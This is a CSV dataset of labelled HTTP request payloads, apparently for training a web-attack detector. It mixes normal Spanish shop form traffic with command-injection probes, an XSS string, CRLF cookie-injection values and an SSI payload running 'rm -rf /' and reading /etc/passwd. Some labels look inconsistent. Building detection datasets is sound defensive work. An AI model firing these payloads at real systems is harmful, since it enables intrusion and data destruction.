payload,label,source
modo=registro&login=tapp&password=amebeo&nombre=Elias&apellidos=Salguero+Peri&email=holgate5@convention.as&dni=12671973P&direccion=Los+Trigales+95+&ciudad=N�jera&cp=28440&provincia=Zaragoza&ntc=7526291145478367&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
ADFECD85E3D1AD8AD937B156A7C62D3C,Normal,csic_gsi:cisc_normalTraffic_train.txt
011F5445F303168864240FEA23067F53,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3B%20str%3D%24%28echo%20PRACFZ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
Tonsmann+Puigferrer,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8443&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
6A6942E2142DFEEC61823EBB97E422B6,Normal,csic_gsi:cisc_normalTraffic_test.txt
E8FEE54CF4D99A063E4ED819F4CF1171,Normal,csic_gsi:cisc_normalTraffic_train.txt
dikaitis5,Normal,csic_gsi:cisc_normalTraffic_train.txt
8A2A23D7F6CA53D878A95357F973A93D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BroDio,Normal,csic_gsi:cisc_normalTraffic_test.txt
m893e787,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
38C577E37D4E9A1CD78509CCD955D824,Normal,csic_gsi:cisc_normalTraffic_train.txt
60233B9BB8DA43EA867B001D107C9E93,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
||echo%20RFRIIL$((68%2B10))$(echo%20RFRIIL)RFRIIL|,CMD,seclists_cmd
919B1E9EE47B6CC96041C893FAC23825,Normal,csic_gsi:cisc_normalTraffic_test.txt
5im2n507,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
mahibur,Normal,csic_gsi:cisc_normalTraffic_test.txt
3FA18C886F18A6B936BA8ADF051900F6,Normal,csic_gsi:cisc_normalTraffic_train.txt
C386D4E9DD1066C2D0FD4BF4133892C9,Normal,csic_gsi:cisc_normalTraffic_test.txt
D68BED2BEE322A30F3E27B869498C428,Normal,csic_gsi:cisc_normalTraffic_test.txt
3soMEr�A,Normal,csic_gsi:cisc_normalTraffic_train.txt
Paracuellos,Normal,csic_gsi:cisc_normalTraffic_train.txt
Villahoz,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=2&nombre=Queso+Manchego&precio=39&cantidad=71&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
6234916143793622,Normal,csic_gsi:cisc_normalTraffic_test.txt
29753,Normal,csic_gsi:cisc_normalTraffic_test.txt
50549,Normal,csic_gsi:cisc_normalTraffic_train.txt
EA444DCF7118F198BBBF6830C5DD0350,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%3B%20str%3D%24%28echo%20WSGIYR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
%7C%20%5B%202%20-ne%20%24%28echo%20TKXZEX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
%2522%0A%20str%3D%24%28echo%20VOOIFO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
922B36CCD6BD0C54F8DEFB3B7F31C6D7,Normal,csic_gsi:cisc_normalTraffic_test.txt
8495227312439801,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
49192685D,Normal,csic_gsi:cisc_normalTraffic_test.txt
4DA34DED674C948E33468646134B5350,Normal,csic_gsi:cisc_normalTraffic_test.txt
E1507683B902B53A3D1A6D8240A44032,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login=cecile&password=hervidor&nombre=Ideimar&apellidos=Selles+Tanari&email=dac@eonon.com.cy&dni=98058748L&direccion=C/+Alcazalquivir+S/N+&ciudad=Galbarros&cp=37718&provincia=Zaragoza&ntc=3153195738365975&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
B�ez+Clua,Normal,csic_gsi:cisc_normalTraffic_train.txt
E354441DC36E55F6399AB52F4BA53D80,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E6679D379D7447671C034DA28A0CE45D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3BDACC61FED00ECE4507A442C52C141B,Normal,csic_gsi:cisc_normalTraffic_test.txt
479E53E46F55FAAAB1FE0CFE750D394F,Normal,csic_gsi:cisc_normalTraffic_test.txt
D1A9C9DCCBE5928DAA68D4A0B7C2150F,Normal,csic_gsi:cisc_normalTraffic_train.txt
61199391W,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20XELPPN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,seclists_cmd
Vilari�o+de+Conso,Normal,csic_gsi:cisc_normalTraffic_test.txt
riggsbee,Normal,csic_gsi:cisc_normalTraffic_train.txt
6B8466D4FF4AB6E1B96546241C5E6F99,Normal,csic_gsi:cisc_normalTraffic_test.txt
0E7D259579DE111A661DC07731E893A3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
100/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B75024120E1591835F9DA1D75DACE7A3,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20XNKLKW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
"modo=registro&login=hao-yung&password=pis59U84&nombre=Santina&apellidos=Berzal+Capllonc&email=angadi.frankovitch@conac.com.so&dni=71621175A&direccion=Glorieta+De+Congresos,+100+5F&ciudad=Carcedo+de+Bureba&cp=28729&provincia=Salamanca&ntc=2102280198560516&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
"<XSS STYLE=""xss:expression(alert('XSS'))"">",XSS,fuzzdb_xss
"modo=registro&login=houdini&password=cabile�a&nombre=Yulisa&apellidos=Aup�+Feria&email=hee4@ropadegolf.name&dni=77786356B&direccion=C/+Guatemala,+S/N,+6G&ciudad=J�vea/X�bia&cp=39790&provinciaA=Zaragoza&ntc=2661491792098457&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Plaza+Pedro+Marcos,+145+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BE644BC039263E8672991C2B2AA19972,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Algerri,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
6E03C4B3588B06840E396000C2B150EE,Normal,csic_gsi:cisc_normalTraffic_test.txt
von_ende6,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JTLWWU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
%7C%20%5B%208%20-ne%20%24%28echo%20QPUCUQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
monaco,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=jean-pau&password=6025a&nombre=Ivanka&apellidos=Padura+Lacruz&email=calvert-westgate@wdsl.im&dni=80147418P&direccion=Calle+Tomas+Ostariz+Forcen+28+&ciudad=Vilanova+i+la+Geltr�&cp=18297&provincia=C�ceres&ntc=4769477830096089&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
Campo+de+Criptana,Normal,csic_gsi:cisc_normalTraffic_test.txt
008A35A88FE1C4F1BAF2533AC0FC3DA2,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login=bates&password=EnMoNARs8&nombre=Joselina&apellidos=Romera+Zuleta&email=oatman@carloshoya.com.in&dni=59798762G&direccion=Pl.+Remondo+S/N+&ciudad=Torrecilla+de+la+Torre&cp=39577&provincia=Toledo%3F&ntc=6109070637889361&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Martin+Bansells,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20EBRLPU$((95%2B26))$(echo%20EBRLPU)EBRLPU//,CMD,seclists_cmd
79135D8CFD0EEF7C64AB99171E650DC3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5CF250100A9FA61BCA2FAD90E9F63E0B,Normal,csic_gsi:cisc_normalTraffic_test.txt
6084149994825775,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=dionisio&pwd=reclinar&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Argullos+73,+9?A",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%3B%20str%3D%24%28echo%20CHSJVY%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
8D24D8BB54388472D726DD9C7EEC94E2,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""%20echo%20OQFTMT$((91%2B48))$(echo%20OQFTMT)OQFTMT%26",CMD,seclists_cmd
35560,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=chuang&pwd=visionario&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
50136,Normal,csic_gsi:cisc_normalTraffic_train.txt
5504F63F5BC113992D53B8E8AC2DB624,Normal,csic_gsi:cisc_normalTraffic_train.txt
909128E0CED097397A344F0456528AC8,Normal,csic_gsi:cisc_normalTraffic_test.txt
048EB89424ED077F0F76F286A916892E,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=towler&password=le0ra&nombre=Verena&apellidos=Rog�+Paredes&email=hobel@spainbareback.sj&dni=37027899S&direccion=Grileira+48,+&ciudad=Idiazabal&cp=19445&provincia=Salamanca&ntc=2013430268092407&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
499B18741A87B0124D3BD719679C413D,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=peiser&password=9iri7aza&nombre=Nevel&apellidos=Domenge+Canelas&email=kirland-lincovsky@la-sexta-f1.fo&dni=48549953N&direccion=Rio+Jarama+194+6-H&ciudad=Valverdejo&cp=20150&provincia=Toledo&ntc=9766800722499068&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
62804C13C853459922A1EB58EA17CD83,Normal,csic_gsi:cisc_normalTraffic_test.txt
EB3F02882C265A7F22B29AA032A7C3FD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
22430,Normal,csic_gsi:cisc_normalTraffic_train.txt
7251909180967020,Normal,csic_gsi:cisc_normalTraffic_test.txt
C9F0EFE0C4501EB875ED2302632D3491,Normal,csic_gsi:cisc_normalTraffic_train.txt
21648C00974DAF2217AC847823DE96BE,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%206%20-ne%20%24%28echo%20DAJIYU%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
63a5et�5192,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22&echo%20QWXPLL$((32%2B57))$(echo%20QWXPLL)QWXPLL%5C%5C,CMD,seclists_cmd
9F4D29671F77BBC58FF01C8CA61DE5BD,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%7Cecho$IFSXRRNLV$((42%2B73))$(echo$IFSXRRNLV)XRRNLV\,CMD,seclists_cmd
gAs40SO,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20LVMWXB%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
DF37E535AF5586F4C53A9F1F018F5DC1,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
modo=registro&login=capes&password=desemperezar&nombre=Itallia&apellidos=Ayarza+Quintal&email=wei@alfombra.com.gw&dni=82166751X&direccion=Llan�a+16+&ciudad=Torla&cp=31522&provincia=?&ntc=0723351625880614&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
053C99AF5673789FC176397FFBF828AD,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=eirena&password=imp�b7ro&nombre=Bernardo&apellidos=Verdeny+Feal&email=higgins6@zing.gm&dni=86166115L&direccion=C/+Rey+Abu+Said+117+&ciudad=Or�soain&cp=26526&provincia=Burgos&ntc=4145418997110831&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20QIIKMD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
%22%7C%20%5B%201%20-ne%20%24%28echo%20SYHTME%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
d2oD7177Is,Normal,csic_gsi:cisc_normalTraffic_test.txt
C5AE1B184C6ACDC7438CF4EA2D30BA02,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2AF4D5EE46305B4E2B29D45301449410,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""")print(`echo%20RPOOHR%0aecho%20$((72%2B27))%0aecho%20RPOOHR%0aecho%20RPOOHR`)%3B%252523RPOOHR",CMD,seclists_cmd
'.print(`echo%20GDFQZF;echo%20$((65%2B2));echo%20GDFQZF;echo%20GDFQZF`)%3B//GDFQZF,CMD,seclists_cmd
25519D0C49B56F08BDC10A5792A496B9,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3Becho$IFSTREOSX$((82%2B26))$(echo$IFSTREOSX)TREOSX,CMD,seclists_cmd
2ef02i1do,Normal,csic_gsi:cisc_normalTraffic_test.txt
608C30AA4B14363D3B2AB86C6B92409F,Normal,csic_gsi:cisc_normalTraffic_test.txt
holmer,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20IHGKBJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
B748B94E8893F60E7ECAB316FE3A0073,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
.cloroF�6iCo,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=david-ye&password=r0326451anis81&nombre=Zacar�as&apellidos=Lezama&email=cavey.cox@directoriogratuito.ec&dni=96174245K&direccion=Pl.+Pintor+Salvador+Soria+20,+&ciudad=Bunyola&cp=46317&provincia=A+Coru�a&ntc=6308702892604693&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Vino+Rioja&precio=39&cantidad=7&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Virgen+Del+Valsordo,+44,+3-A",Normal,csic_gsi:cisc_normalTraffic_train.txt
"Rambla+Jalencas<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->",PathTraversal,csic_gsi:cisc_anomalousTraffic_test.txt
echo$IFSMFYMXE$((53%2B41))$(echo$IFSMFYMXE)MFYMXE',CMD,seclists_cmd
wincott_remeck@enformetera.com.sc,Normal,csic_gsi:cisc_normalTraffic_train.txt
cicco_coca@hostingprofessional.com.np,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20SFURKW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
';echo%20HPSGQK$((19%2B98))$(echo%20HPSGQK)HPSGQK%27,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20DPBAVN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
'%3Becho$IFSTMWIFK$((5%2B69))$(echo$IFSTMWIFK)TMWIFK//,CMD,seclists_cmd
id=1&nombre=Vino+.*?Rioja&precio=85&cantidad=74&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
29FB41C200249AACE65D538448C1421A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
02080C410B5458E1946DBCC75443F18A,Normal,csic_gsi:cisc_normalTraffic_test.txt
1350447535832439,Normal,csic_gsi:cisc_normalTraffic_train.txt
medboe-krasojevic@paseotuperro.bu,Normal,csic_gsi:cisc_normalTraffic_test.txt
96EF58AF2079E421788C8172D91A2771,Normal,csic_gsi:cisc_normalTraffic_train.txt
001E4D8BEDC4B78375EA68D86973B215,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu�o&email=luca8@mobilecrm.iq&dni=41944054N&direccion=Pla�a+Don+Ramon+Serrano+Su�er,+S/N+&ciudad=Antig�edadany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8790895171234504,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3B%20str%3D%24%28echo%20UYJMIM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,CMD,seclists_cmd
rahimtoo8,Normal,csic_gsi:cisc_normalTraffic_test.txt
9D805264FBA1CD26C2B65888A2D6D087,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=phan&password=enJalbegada&nombre=Anatoly&apellidos=Antypas+Sardans&email=stanczak-kasem@movil-google.tj&dni=08071780E&direccion=C/+Rodenas+170,+11?G&ciudad=Santa+Cristina+de+Valmadrigal&cp=08110&provincia=Burgos&ntc=7812372382354284&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20OKKNHF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
"modo=registro&login=celestin&password=acetOSi0La&nombre=Constantino&apellidos=Veneroso+De+Manuel&email=funato@psychominders.co&dni=82399457W&direccion=Avda.+Lagunas+De+Ruidera,+70,+5?E&ciudad=Pesoz&cp=12449&provincia=Le�n&ntc=971364397960361&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Monasterio+de+Vega,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=3any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235&nombre=Vino+Rioja&precio=39&cantidad=40&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modoA=entrar&login=vivek&pwd=muletillera&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
colvin@freemachine.no,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=shaibal&password=.11NE5o&nombre=Huari&apellidos=Mc'Morral+Obrist&email=askam@maxtienda.er&dni=91436910L&direccion=Chato+De+La+Isla,+50+10-G&ciudad=Lezama&cp=47620&provincia=C�ceres&ntc=9056484904037520&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
CEC13D9E82674F4429146FE2195BA5B6,Normal,csic_gsi:cisc_normalTraffic_train.txt
BEC6D40850C2FF1D289AD297A5D31475,Normal,csic_gsi:cisc_normalTraffic_train.txt
sal-tarel,Normal,csic_gsi:cisc_normalTraffic_test.txt
5498019386579273,Normal,csic_gsi:cisc_normalTraffic_test.txt
||echo$IFSCDNNJT$((44%2B92))$(echo$IFSCDNNJT)CDNNJT%5C%5C,CMD,seclists_cmd
1702414193720942,Normal,csic_gsi:cisc_normalTraffic_train.txt
6ECFD461FCC13F6F2A19EC01F719042E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E6C199B27F112B02C6C81F83ACDB08CA,Normal,csic_gsi:cisc_normalTraffic_train.txt
";echo$IFSSNFHZG$((95%2B62))$(echo$IFSSNFHZG)SNFHZG""",CMD,seclists_cmd
"modo=registro&login=rechelle&password=4ri9c4&nombre=Danna&apellidos=Grillo+Matamalas&email=funkvist@engomera.com.com&dni=44373062J&direccion=Paracuellos,+S/N+&ciudad=Abanilla&cp=44643&provincia=Le�n&ntc=2100619474329828&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
8E1A10541C4CAC74429320D5343FE23D,Normal,csic_gsi:cisc_normalTraffic_train.txt
D48B4C3B3AA206C895FC94A9793DAEA5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DeMon�latRa,Normal,csic_gsi:cisc_normalTraffic_train.txt
09475421L,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
84E425DCCE9DC2A3F23524104EDE7978,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
16362236J,Normal,csic_gsi:cisc_normalTraffic_train.txt
9DA524DCC4C1B5A90ED957613BEEFEEA,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27&&echo$IFSQNMPMK$((16%2B94))$(echo$IFSQNMPMK)QNMPMK,CMD,seclists_cmd
14157DEEC241B27AB96F7567BFF26852,Normal,csic_gsi:cisc_normalTraffic_test.txt
7165C0474ED519BA564C4860C00215DD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1547,Normal,csic_gsi:cisc_normalTraffic_test.txt
David,Normal,csic_gsi:cisc_normalTraffic_test.txt
35AC8F31607FB0DA1728DC88A73803C2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3FB8699FA0E84F27B06CDCA55F46185C,Normal,csic_gsi:cisc_normalTraffic_test.txt
E97692E55639D19C8557A146BE8987D2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0A28D3E81FB5EB4A28B7A1ADCE438D42,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%203%20-ne%20%24%28echo%20RZSNER%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,CMD,seclists_cmd
F24F3519E82BFD7C6AEBBD711CDF43F9,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=coord2&password=fofa&nombre=Neria&apellidos=Halpin+Pedrote&email=bosacker-bellwood@thecupidhouse.mv&dni=37397769E&direccion=Pla�a+De+Dolors+Miralles,+122,+&ciudad=Granja+de+Torrehermosa&cp=11150&provincia=Madrid&ntc=7978142136130087&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Ques+o+Manchego&precio=39&cantidad=65&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7432496591066069,Normal,csic_gsi:cisc_normalTraffic_test.txt
89979C59C60A17CF6E2A0B177BE2F1D8,Normal,csic_gsi:cisc_normalTraffic_train.txt
2615220846617019,Normal,csic_gsi:cisc_normalTraffic_train.txt
ruskin@15horas.se,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CECD5C5814407E5720F9314EF5C49CEF,Normal,csic_gsi:cisc_normalTraffic_test.txt
E82EEB0A7760B527FAD06EB5A9D8EDBB,Normal,csic_gsi:cisc_normalTraffic_test.txt
0875023CE6875170CAC50E42E49E8B92,Normal,csic_gsi:cisc_normalTraffic_test.txt
C/+Cardenal+Benilloch+171+12?H,Normal,csic_gsi:cisc_normalTraffic_train.txt
3687A507C4A5EFB91EF189D65EBDFD6D,Normal,csic_gsi:cisc_normalTraffic_train.txt
0F0E433FE605A5C6A80FE8EC4FF19CE5,Normal,csic_gsi:cisc_normalTraffic_train.txt
8843476140165656,Normal,csic_gsi:cisc_normalTraffic_test.txt
9CD2BFE53B047C2D49E69C497AF2DBE2,Normal,csic_gsi:cisc_normalTraffic_train.txt
36A267DD0B8A587CE00BF7DFCEA7B717,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
80586083V,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Rangle,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"%26%26echo%20WXDFTC$((82%2B43))$(echo%20WXDFTC)WXDFTC""",CMD,seclists_cmd
"modo=registro&loginA=eastreg&password=impla6ica1le&nombre=Carmen&apellidos=Gr�cia+Puigmart�&email=dufresne@mauvier.hk&dni=51243773A&direccion=Calle+Perla,+71+&ciudad=Villalbilla&cp=45594&provincia=Le�n&ntc=7784731967679465&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Del+Barrio,Normal,csic_gsi:cisc_normalTraffic_train.txt
CD6300748768A5A38DF8959822F18BE6,Normal,csic_gsi:cisc_normalTraffic_test.txt
CE1661125D0CD859768DE0EC1108D922,Normal,csic_gsi:cisc_normalTraffic_train.txt
sirola@professionalhost.cc,Normal,csic_gsi:cisc_normalTraffic_train.txt
San+Mart�n+del+R�o,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D1E9D2D846D78F9158ECA0E879F92193,Normal,csic_gsi:cisc_normalTraffic_test.txt
37576555Y,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20echo%20HCOMBJ$((69%2B6))$(echo%20HCOMBJ)HCOMBJ,SQLi,community:payloads_seed
Gerindote,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
890FF1C14ED8DF52E6BA1FC776106C87,Normal,csic_gsi:cisc_normalTraffic_train.txt
05B1537F887AE7E60BDF0E334CF191C2,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CLRJXD%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
BA7EE29F050C5928F343950770E19A31,Normal,csic_gsi:cisc_normalTraffic_test.txt
